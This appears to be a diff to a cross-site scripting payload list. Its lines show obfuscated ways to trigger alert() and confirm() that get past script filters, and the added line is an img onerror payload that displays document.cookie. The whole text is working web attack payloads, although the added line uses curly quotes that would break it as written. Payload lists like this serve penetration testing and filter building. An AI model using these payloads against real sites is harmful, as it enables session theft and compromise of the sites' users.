@@ -11,3 +11,4 @@ window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
 document['default'+'View'][`\u0061lert`](3)
 this.ownerDocument.defaultView['\u0061lert'](4)
 confirm?.(1)
+<img src=”invalid-image” onerror=”alert(document.cookie)”>
